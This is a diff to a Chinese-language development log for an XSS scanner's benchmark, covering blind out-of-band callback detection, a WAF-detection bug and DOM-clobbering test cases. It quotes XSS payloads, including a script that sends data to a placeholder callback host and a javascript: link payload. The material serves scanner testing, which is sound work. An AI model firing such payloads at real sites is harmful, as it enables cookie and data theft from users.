@@ -386,6 +386,15 @@ sync 首次跑出**全绿**（旧基线有 6 个 safe 用例因 loopback 中断�
 
 **引擎缺陷（本轮真正的大鱼，家族第二例基准驱动）**：`waf.detect()` 用 `full_blob`（headers+body）搜 `_BLOCK_BODY_HINTS`，而 hints 里有 `cf-ray|cloudflare` 形态——**伪 WAF 的指纹响应头自己命中了自己**：所有 WAF 站**未拦截的 200 响应**被判成 blocked → `_try_payload` 全部 continue → **凡带 WAF 指纹的站点，所有 payload 确认静默失效**（无声漏报生成器，pos-pshift-01 的 227 请求零确认就是它）。修法：block-page hints 是 **body 信号**，两处 `full_blob` → `body_excerpt`；`tests/test_waf_detect_block_hints.py` 6 例锁定（未拦截 200 + 指纹头 ≠ blocked、真 block 页面 body → blocked、强状态码恒 blocked 等）。与 Phase 119（marker 边界）同源：**基准不只测"能不能检出"，还在抓"确认管线自相矛盾"的缺陷**。
 
+**Phase 124：`L5_blind_oob` 覆盖（真实的带外回连确认，不需要浏览器）**。盲打 OOB 是"最高标准"基线里最有分量的一条，此前一直挂在"需 OOB 监听器"上——但这层其实**已经有自建监听器**（`xssentinel/core/oob.py` 的 `SelfHostedListener`，`--oob self`，token 走 URL path），真正缺的是**一个会让回调真的被加载的目标**。
+
+难点在于浏览器：通常要有"受害者客户端"才会去取那个 URL。本轮把这一步建模掉了——目标是个**链接展开/图片代理**形态的应用，它会解析提交内容并解析真实元素所引用的资源。关键是这个展开器必须**基于 HTML 解析器**，而不是"全文正则扫 http(s) URL"：否则转义后的 safe 双胞胎（文本里照样含有回调 URL）也会回连，这个用例就什么都证明不了。
+
+中途踩到一个必须写下来的坑：我最初只解析 `src`/`href` 属性，结果 `pos-blind-01` 判 **FN**——引擎真正用的第一个 blind 载荷是 `<script>new Image().src='https://__OOB__/?c='+...</script>`，**回调 URL 藏在内联 JS 文本里，不在任何属性上**。修法是让展开器同时看三个位置：真实元素的资源类属性、**事件处理器属性**（`onload=` 等）、以及**真实 `<script>` 元素的文本内容**；**纯文本节点一律忽略**——这正是让转义版保持沉默的那条界线。
+
+验证（三重口径）：① 目标层面直接用真载荷探小心：vuln 回连成功 / safe 不回连；② 基准口径 **TP1 TN1**，且 pos 的 finding 类型是查出来的 **`blind`**（high/high），`extra_args` 带 `--oob self`；③ 零 finding 门禁这次**必须挂真监听器**否则 blind 层根本不跑——结果为 0。
+**修正后：49 层中 43 已覆盖，6 未覆盖**（L4_second_order、L7_mutation、L7_time_based、L8_cookie_tossing、L7_xsleak、L9_scenario）。
+
 **Phase 123：`L7_dom_clobber` 覆盖，并修掉第三个基准驱动的引擎缺陷（转义过的反射仍被当成真实属性）**。
 
 按"先看代码再写用例"的规矩确认触发链：该层把 `<a id={token} name={token} href="javascript:alert(1)">x</a>` 打进参数，要求① `id=<token>` 是**真实落地的属性**、② 页面 JS 里存在 `getElementById(...)` / `document.<name>` / `querySelector('#...')` 这类引用、③ 存在危险 sink，三者齐才发 `type="dom_clobber"`（类型是查出来的，不是猜的）。
